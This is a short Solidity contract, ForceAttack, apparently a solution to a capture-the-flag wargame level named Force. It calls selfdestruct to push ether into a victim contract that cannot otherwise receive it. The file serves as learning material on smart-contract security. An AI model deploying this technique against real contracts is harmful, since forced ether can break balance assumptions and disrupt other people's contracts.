// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./Force.sol";

contract ForceAttack {

  Force public victimContract;

  constructor(address _victimContract) {
    victimContract = Force(_victimContract);
  }

  function attack() public payable {
    require (msg.value > 0, "send some eth");
    selfdestruct(payable(address(victimContract)));
  }
}